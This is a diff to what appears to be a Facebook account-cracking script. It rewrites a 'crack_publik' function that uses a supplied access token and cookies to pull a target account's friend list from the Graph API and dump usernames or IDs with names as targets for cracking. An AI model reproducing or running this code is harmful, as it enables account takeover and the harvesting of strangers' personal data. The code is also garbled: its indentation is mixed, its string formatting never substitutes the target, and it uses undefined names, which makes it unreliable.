@@ -502,17 +502,35 @@ def get_komen(url):
 			try:get_komen("https://mbasic.facebook.com"+z["href"])
 			except:pass
 
-def crack_publik():
+def crack_publik(t,c):
 
 	akun = input(f'[{hh}!{P}] MAKE SURE THE ACCOUNT IS PUBLIC\n[{hh}?{P}] ID : ')
-	try:
-		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
+	for user in uid:
+	    try:
+	       head = (
+	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+		bas = ses.get('https://graph.facebook.com/{akun}'.format(user),params=params,headers=head,cookies={'cookies':c}).json()
 		for pi in bas['friends']['data']:
 			try:
 				try:
-					dump = (pi['username']+'|'+pi['name'])
+					dump.append(pi['username']+'|'+pi['name'])
 				except:
-					dump = (pi['id']+'|'+pi['name'])
+					dump.append(pi['id']+'|'+pi['name'])
 				print(f'\r[{hh}!{P}] Dumping %s id'%(len(dump)),end=" ")
 				sys.stdout.flush()
 				time.sleep(0.0002)
